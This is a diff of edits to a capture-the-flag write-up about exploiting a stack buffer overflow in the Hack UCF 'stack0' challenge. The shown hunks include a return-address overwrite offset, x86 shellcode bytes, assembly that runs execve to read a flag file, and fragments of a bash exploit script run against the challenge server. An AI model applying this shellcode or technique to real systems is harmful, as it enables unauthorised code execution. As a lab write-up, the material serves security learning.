@@ -6,13 +6,15 @@
 **Description:**
 
 Author: C0deH4cker
+
 nc ctf.hackucf.org 32101
+
 This is the same program as stack0 part 1. Now, read the contents of flag2.txt.
 
 > **Files:** stack0, stack0.c and libpwnableharness32.so
 
 ## Write-up
-This is a buffer overflow challenge, adding on to [Pwn_stack0pt1](https://github.com/neuronflicker/CTF/tree/master/UCF/Pwn_stack0pt1) and the code file was provided.
+This is a buffer overflow challenge, building on [Pwn_stack0pt1](https://github.com/neuronflicker/CTF/tree/master/UCF/Pwn_stack0pt1), and the code file was provided.
 
 I ran the program to remind myself of how it worked:
 ```bash
@@ -21,7 +23,7 @@ Debug info: Address of input buffer = 0xff862aed
 Enter the name you used to purchase this program: fred
 This program has not been purchased.
 ```
-Looking at the code, and the `handle_connection()` function, it contains a `read()` call into a buffer of 50 chars:
+Looking at the code, and the `handle_connection()` function, it contains a `read()` call into a buffer of 50 chars (though the `read()` takes up to 1024 characters):
 ```c
 static void handle_connection(int sock) {
 	bool didPurchase = false;
@@ -74,7 +76,7 @@ This ensures we fill our 50-character input buffer with `A` characters, and the 
 
 ![Stack input and return address](stack_input_and_ret.png)
 
-We can see we need to send 63 characters, and then we can change the return address.
+We can see we need to send 63 characters to fill the stack space, and then we can change the return address.
 
 So we can take the script from [Pwn super-stack](https://github.com/neuronflicker/CTF/tree/master/UCF/Pwn_super-stack) and update it to account for the buffer size of this program:
 ```bash
@@ -124,7 +126,7 @@ cat <&3
 # Close the socket
 exec 3<&-
 ```
-The code has 37 characters in it, so we add an extra 26 to make up the 63 we need. Then we add the address of the buffer as the return address. This initial code is out `ls` code, so the output from running this script is:
+The code has 37 characters in it, so we add an extra 26 to make up the 63 we need. Then we add the address of the buffer as the return address. This initial code is our `ls` code, so the output from running this script is:
 ```
 > ./hack_stack0pt2.sh 
 Found: Debug info: Address of input buffer = 0xff8c084d
@@ -137,7 +139,7 @@ flag1.txt
 flag2.txt
 stack0
 ```
-So we could just add our `cat` code and see the contents of the `flag2.txt` file, but let's try something different. Let's see if we can change the `flagfile` `const char*` string from `flag1.txt` to `flag2.txt` and then call `giveFlag()` to get the contents. I don't know if this is possible as the string is in a segment marked as read-only, but let's try. It may depend on how the code was compiled.
+So we could just add our `cat` code and see the contents of the `flag2.txt` file, but let's try something different. Let's see if we can change the `flagfile` `const char*` string from `flag1.txt` to `flag2.txt` and then call `giveFlag()` to get the contents. I don't know if this is possible as the string is in a data segment marked as read-only, but let's try. It may depend on how the code was compiled.
 
 First we find the location of the `flagfile` string within the executable:
 
@@ -152,6 +154,7 @@ We also need the location of the `giveFlag()` function:
 This is at `0x080486AB`.
 
 Now we can write some assembly language to try to change `flag1.txt` to `flag2.txt` and jump into the `giveFlag()` function.
+
 First, I wrote some code to check I have a working piece of assembly language before inserting it in the input buffer:
 ```asm
 # Write to address and jump to function
@@ -200,7 +203,7 @@ Again, this was compiled with:
 ```
 > nasm -felf change_filename.asm -o change_filename.o && ld -m elf_i386 -o change_filename change_filename.o
 ```
-and the codes we need for our script output with:
+and the codes we need for our script was output with:
 ```
 > objdump -d ./change_filename|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\xc6\x05\x64\x88\x04\x08\xff\x25\xab\x86\x04\x08"
@@ -296,10 +299,15 @@ _start:  xor eax, eax               ; Start with EAX at 0
          int 0x80
 ```
 > Note: This uses `.//flag2.txt` rather than just `flag2.txt` as we need to align to the 32-bit stack. This means the values pushed to the stack have to be in sets of 4 bytes, so `flag2.txt` would leave a single byte.
+>
 > First I tried `fla*.txt` as I thought it might list all flag files, but this doesn't work because we're running through `execve()` and not in a shell, so no wildcard substitution happens.
+>
 > Then I tried to pad with three spaces to give `flag2.txt   `, but the `read()` in the code ate two of the spaces and so messed up the byte values, changing the code.
+>
 > Next I tried with the relative path and a space at the end to pad - `./flag2.txt `, but `execve()` treated the space as part of the filename.
+>
 > Finally, I tried the `.//flag2.txt` which worked, but not before we had another issue.
+
 The above code was compiled and converted with:
 ```
 > nasm -felf cat_code.asm -o cat_code.o && ld -m elf_i386 -o cat_code cat_code.o
@@ -313,7 +321,7 @@ I then checked the number of bytes with:
 ```
 So we have 56 characters, which fits nicely in our buffer. We just need to pad by 7 characters to make our necessary 63. I put this in the previous script and ran it, but there is a problem with this code. When performing the pushes in the code, the buffer gets overwritten as the stack fills into it. This means the code is corrupted and doesn't work. The `ls` from earlier works because the code is small enough.
 
-Maybe we can put the code further down the stack and call it there. This will mean using 63 `A` characters to fill the buffer, followed by the address of where we are going to put our code, which will be immediately after the return address. Our new return address needs to be the buffer start + 67 (0x43). The 67 is the length of the buffer plus the return address. To do this, our final script becomes:
+Maybe we can put the code further down the stack and call it there. This will mean using 63 `A` characters to fill the buffer, followed by the address of where we are going to put our code, which will be immediately after the return address. Our new return address needs to be the buffer start + 67 (0x43). The 67 is the length of the buffer plus the length of the return address. To do this, our final script becomes:
 ```bash
 #!/bin/bash
 
@@ -381,4 +389,4 @@ Here is your first flag: flag{<flag from stack0pt1 was here>}
 flag{<flag from this challenge was here>}
 Done!
 ```
-This gave us the flag!
+This worked and gave us the flag!
